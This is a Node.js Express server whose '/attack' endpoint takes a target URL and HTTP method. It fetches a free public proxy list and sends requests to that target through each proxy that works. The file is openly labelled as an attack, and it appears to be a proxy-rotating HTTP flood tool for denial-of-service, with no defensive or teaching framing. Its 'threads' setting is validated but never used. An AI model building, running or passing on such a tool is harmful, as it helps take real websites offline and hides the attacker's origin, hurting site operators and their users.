const express = require('express');
const axios = require('axios');
const cors = require('cors');
const bodyParser = require('body-parser');
const { validationResult, check } = require('express-validator');

const app = express();
app.use(cors());
app.use(bodyParser.json());

let successfulRequests = 0;

// Validate URL, method, and threads
const validateForm = [
  check('url').isURL().withMessage('Invalid URL'),
  check('method').isIn(['GET', 'POST']).withMessage('Invalid method'),
  check('threads').isInt({ min: 1 }).withMessage('Threads must be a positive integer')
];

// Middleware to handle form validation errors
const handleValidationErrors = (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  next();
};

// Function to check if proxy is valid
const isValidProxy = async (proxy) => {
  try {
    await axios.get('https://api.proxyscrape.com/v3/free-proxy-list/get', {
      proxy: {
        host: proxy.host,
        port: proxy.port
      }
    });
    return true;
  } catch (error) {
    return false;
  }
};

// Attack endpoint
app.post('/attack', validateForm, handleValidationErrors, async (req, res) => {
  const { url, method, threads } = req.body;

  // Fetch proxies from the API
  const response = await axios.get('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=all&country=all&anonymity=all&timeout=20000&proxy_format=ipport&format=text');
  const proxies = response.data.split('\n');

  // Send requests using proxies
  const requestsPromises = proxies.map(async (proxy) => {
    const proxyParts = proxy.split(':');
    const proxyObj = {
      host: proxyParts[0],
      port: proxyParts[1]
    };
    if (await isValidProxy(proxyObj)) {
      try {
        await axios({
          method: method,
          url: url,
          proxy: proxyObj
        });
        successfulRequests++;
        console.log('Request sent using proxy:', proxy);
      } catch (error) {
        console.error('Failed to send request using proxy:', proxy);
      }
    } else {
      console.error('Invalid proxy:', proxy);
    }
  });

  // Wait for all requests to finish
  await Promise.all(requestsPromises);

  res.json({ successfulRequests });
});

// Endpoint to get the number of successful requests
app.get('/successful-requests', (req, res) => {
  res.json({ successfulRequests });
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
